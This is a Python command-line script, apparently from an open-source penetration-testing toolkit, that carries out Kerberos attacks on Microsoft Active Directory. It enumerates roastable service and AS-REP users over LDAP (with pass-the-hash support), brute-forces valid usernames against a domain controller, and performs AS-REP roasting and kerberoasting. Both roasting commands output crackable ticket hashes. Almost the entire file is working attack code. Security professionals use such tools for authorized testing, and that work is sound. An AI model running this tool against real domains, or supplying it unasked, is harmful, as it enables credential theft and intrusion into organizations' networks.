#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#

from msldap.core.msldap import *
from msldap.ldap_objects import *
from msldap import logger as msldaplogger

from minikerberos import logger as kerblogger
from minikerberos.security import *
from minikerberos.common import *
from minikerberos.communication import *
import ntpath
import logging
import getpass
import os

def from_target_string(target):
	#get domain, username, password
	domain = None
	password = None
	m = target.find('@')
	if m == -1:
		raise Exception('Failed to find address!')
	address = target[m+1:]

	m = target.rfind('@')
	if m == -1:
		raise Exception('Could not find username info!')
	temp = target[:m]
	m = temp.find('/')
	if m == -1:
		domain = None
	else:
		domain = temp[:m]
		temp = temp[m+1:]

	m = temp.find(':')
	if m != -1:
		username = temp[:m]
		password = temp[m+1:]
	else:
		username = temp

	return (domain, username, password, address)


def run():
	import argparse

	parser = argparse.ArgumentParser(description='Tool to perform kerberoast attack against service users in MS Active Directory')
	parser.add_argument('-v', '--verbose', action='count', default=0, help='Increase verbosity, can be stacked')


	subparsers = parser.add_subparsers(help = 'commands')
	subparsers.required = True
	subparsers.dest = 'command'

	ldap_group = subparsers.add_parser('ldap', help='Enumerate potentially vulnerable users via LDAP')
	ldap_group.add_argument('type', choices=['spn', 'asrep', 'all'], help='type of vulnerable users to enumerate')
	ldap_group.add_argument('user',  help='LDAP user specitication <domain>/<username>:<password>@<ip or hostname>')
	ldap_group.add_argument('-n','--ntlm',  help='Specify this for passing the hash')
	ldap_group.add_argument('-o','--out-file',  help='Output file base name, if omitted will print results to STDOUT')

	brute_group = subparsers.add_parser('brute', help='Enumerate users via brute-forcing kerberos service')
	brute_group.add_argument('realm', help='Kerberos realm <COMPANY.corp>')
	brute_group.add_argument('address', help='Address of the DC')
	brute_group.add_argument('targets', help='File with a list of usernames to enumerate, one user per line')
	brute_group.add_argument('-o','--out-file',  help='Output file base name, if omitted will print results to STDOUT')

	asreproast_group = subparsers.add_parser('asreproast', help='Perform asrep roasting')
	asreproast_group.add_argument('address', help='Address of the DC')
	asreproast_group.add_argument('-t','--targets', help='File with a list of usernames to roast, one user per line')
	asreproast_group.add_argument('-r','--realm', help='Kerberos realm <COMPANY.corp> This overrides realm specification got from the target file, if any')
	asreproast_group.add_argument('-o','--out-file',  help='Output file base name, if omitted will print results to STDOUT')
	asreproast_group.add_argument('-u','--user',  action='append', help='Target users to roast in <realm>/<username> format or just the <username>, if -r is specified. Can be stacked.')


	spnroast_group = subparsers.add_parser('spnroast', help='Perform spn roasting (aka kerberoasting)')
	spnroast_group.add_argument('logincreds', help='Either CCACHE file name or Kerberos login data <realm>/<username>:<password or NT hash or AES key>@<ip or hostname> Can be omitted for asrep command.')
	spnroast_group.add_argument('-n','--ntlm', action='store_true', help='Indicate if password is actually an NT hash')
	spnroast_group.add_argument('-a','--aes', action='store_true',  help='Indicate if password is actually an AES key')
	spnroast_group.add_argument('-c','--ccache', action='store_true',  help='Indicate if target is actually a CCACHE file')
	spnroast_group.add_argument('-t','--targets', help='File with a list of usernames to roast, one user per line')
	spnroast_group.add_argument('-u','--user',  action='append', help='Target users to roast in <realm>/<username> format or just the <username>, if -r is specified. Can be stacked.')
	spnroast_group.add_argument('-o','--out-file',  help='Output file base name, if omitted will print results to STDOUT')
	spnroast_group.add_argument('-r','--realm', help='Kerberos realm <COMPANY.corp> This overrides realm specification got from the target file, if any')

	args = parser.parse_args()

	if args.verbose == 0:
		logging.basicConfig(level=logging.INFO)
		kerblogger.setLevel(logging.WARNING)
		msldaplogger.setLevel(logging.WARNING)
		
	elif args.verbose == 1:
		logging.basicConfig(level=logging.DEBUG)
		kerblogger.setLevel(logging.INFO)
		msldaplogger.setLevel(logging.INFO)
		
	else:
		logging.basicConfig(level=1)
		kerblogger.setLevel(logging.DEBUG)
		msldaplogger.setLevel(logging.DEBUG)

	#ksoc = KerberosSocket(args.target)

	if args.command == 'spnroast':
		if not args.targets and not args.user:
			raise Exception('No targets loaded! Either -u or -t MUST be specified!')
		targets = []
		if args.targets:
			with open(args.targets, 'r') as f:
				for line in f:
					line = line.strip()
					domain = None
					username = None
					if line.find('/') != -1:
						#we take for granted that usernames do not have the char / in them!
						domain, username = line.split('/')
					else:
						username = line

					if args.realm:
						domain = args.realm
					else:
						if domain is None:
							raise Exception('Realm is missing. Either use the -r parameter or store the target users in <realm>/<username> format in the targets file')

					target = KerberosTarget()
					target.username = username
					target.domain = domain
					targets.append(target)
					
		if args.user:
			for user in args.user:
				domain = None
				username = None
				if user.find('/') != -1:
					#we take for granted that usernames do not have the char / in them!
					domain, username = user.split('/')
				else:
					username = user

				if args.realm:
					domain = args.realm
				else:
					if domain is None:
						raise Exception('Realm is missing. Either use the -r parameter or store the target users in <realm>/<username> format in the targets file')
				target = KerberosTarget()
				target.username = username
				target.domain = domain
				targets.append(target)

		if len(targets) == 0:
			raise Exception('No targets loaded!')
		logging.debug('Kerberoast loaded %d targets' % len(targets))


		if args.ccache:
			raise Exception('Not implemented yet!')

		else:
			domain, username, password, target = from_target_string(args.logincreds)
			if not password:
				password = getpass.getpass()

			if not domain:
				raise Exception('Missing domain from kerberos logon credentials')

			if not username:
				raise Exception('Missing username from kerberos logon credentials')

			if not target:
				raise Exception('Missing target from kerberos logon credentials')


			cred = KerberosCredential()
			cred.domain = domain
			cred.username = username

			if args.ntlm:
				cred.nt_hash = password

			elif args.aes:
				if len(password) == 32:
					cred.kerberos_key_aes_128 = password
				elif len(password) == 64:
					cred.kerberos_key_aes_256 = password
				else:
					raise Exception('Kerberos logon credential AES keysize incorrect!')

			else:
				cred.password = password
			ks = KerberosSocket(target)
			ar = Kerberoast(cred, ks)
			hashes = ar.run(targets)

			if args.out_file:
				with open(args.out_file, 'w') as f:
					for thash in hashes:
						f.write(thash + '\r\n')

			else:
				for thash in hashes:
					print(thash)

			logging.info('Kerberoast complete')



	elif args.command == 'asreproast':
		if not args.targets and not args.user:
			raise Exception('No targets loaded! Either -u or -t MUST be specified!')
		creds = []
		if args.targets:
			with open(args.targets, 'r') as f:
				for line in f:
					line = line.strip()
					domain = None
					username = None
					if line.find('/') != -1:
						#we take for granted that usernames do not have the char / in them!
						domain, username = line.split('/')
					else:
						username = line

					if args.realm:
						domain = args.realm
					else:
						if domain is None:
							raise Exception('Realm is missing. Either use the -r parameter or store the target users in <realm>/<username> format in the targets file')

					cred = KerberosCredential()
					cred.username = username
					cred.domain = domain
					creds.append(cred)

		if args.user:
			for user in args.user:
				domain = None
				username = None
				if user.find('/') != -1:
					#we take for granted that usernames do not have the char / in them!
					domain, username = user.split('/')
				else:
					username = user

				if args.realm:
					domain = args.realm
				else:
					if domain is None:
						raise Exception('Realm is missing. Either use the -r parameter or store the target users in <realm>/<username> format in the targets file')
				cred = KerberosCredential()
				cred.username = username
				cred.domain = domain
				creds.append(cred)

		logging.debug('ASREPRoast loaded %d targets' % len(creds))
		
		ks = KerberosSocket(args.address)
		ar = APREPRoast(ks)
		hashes = ar.run(creds)

		if args.out_file:
			with open(args.out_file, 'w') as f:
				for thash in hashes:
					f.write(thash + '\r\n')

		else:
			for thash in hashes:
				print(thash)

		logging.info('ASREPRoast complete')


	elif args.command == 'brute':
		users = []
		with open(args.targets, 'r') as f:
			for line in f:
				users.append(line.strip())
		ksoc = KerberosSocket(args.address)
		ke = KerberosUserEnum(ksoc)
		results = ke.run(args.realm, users)
		logging.info('Enumerated %d users!' % len(results))
		if args.out_file:
			with open(args.out_file, 'w') as f:
				for user in results:
					f.write(user + '\r\n')

		else:
			print('[+]Enumerated users:')
			for user in results:
				print(user)

		logging.info('Kerberos user enumeration complete')

	

	elif args.command == 'ldap':
		domain, username, password, target = from_target_string(args.user)
		if not password:
			password = getpass.getpass()
		ldap_server = MSLDAPTargetServer(target)
		creds = MSLDAPUserCredential(username = username, domain = domain, password = password, is_ntlm=args.ntlm)
		ldap = MSLDAP(creds, ldap_server)
		ldap.connect()
		adinfo = ldap.get_ad_info()
		domain = adinfo.distinguishedName.replace('DC=','').replace(',','.')

		spn_users = []
		asrep_users = []
		if args.type in ['spn','all']:
			for user in ldap.get_all_service_user_objects():
				spn_users.append('%s/%s' % (domain, user.sAMAccountName))
		if args.type in ['asrep','all']:
			for user in ldap.get_all_knoreq_user_objects():
				asrep_users.append('%s/%s' % (domain, user.sAMAccountName))

		if args.out_file:
			basefolder = ntpath.dirname(args.out_file)
			basefile = ntpath.basename(args.out_file)
			if len(spn_users) > 0:
				with open(os.path.join(basefolder,basefile+'_spn_users.txt'), 'w', newline='') as f:
					for user in spn_users:
						f.write(user+'\r\n')

			if len(asrep_users) > 0:
				with open(os.path.join(basefolder,basefile+'_asrep_users.txt'), 'w', newline='') as f:
					for user in asrep_users:
						f.write(user+'\r\n')
		else:
			print('[+]SPN vuln users:')
			for user in spn_users:
				print(user)
			print('[+]ASREP vuln users:')
			for user in asrep_users:
				print(user)

	
if __name__ == '__main__':
	run()


	"""
	TODO
	gettgt_group = subparsers.add_parser('tgt', help='Get a TGT ticket')
	gettgt_group.add_argument('tgtcmd', default='all', nargs='?', choices=['get', 'renew'], help='what\'s cooking?')
	gettgt_group.add_argument('--kerberos-username','--ku',  help='Kerberos username', required = True)
	gettgt_group.add_argument('--kerberos-password','--kp',  help='Kerberos password')
	gettgt_group.add_argument('--kerberos-use-ntlm','--kn',  help='Kerberos PTH')
	gettgt_group.add_argument('--kerberos-aeskey','--kk',  help='Kerberos AES key')
	gettgt_group.add_argument('--kerberos-realm','--kr',  help='Kerberos Realm of the domain you are trying to enumerate users in (eg. TEST.corp)', required = True)
	

	gettgs_group = subparsers.add_parser('tgs', help='Get a TGS ticket for a specified account')
	gettgt_group.add_argument('tgscmd', default='all', nargs='?', choices=['get', 'renew'], help='what\'s cooking?')
	gettgt_group.add_argument('--kerberos-username','--ku',  help='Kerberos username', required = True)
	gettgt_group.add_argument('--kerberos-password','--kp',  help='Kerberos password')
	gettgt_group.add_argument('--kerberos-use-ntlm','--kn',  help='Kerberos PTH')
	gettgt_group.add_argument('--kerberos-aeskey','--kk',  help='Kerberos AES key')
	gettgt_group.add_argument('--kerberos-realm','--kr',  help='Kerberos Realm of the domain you are trying to enumerate users in (eg. TEST.corp)', required = True)


	"""
		
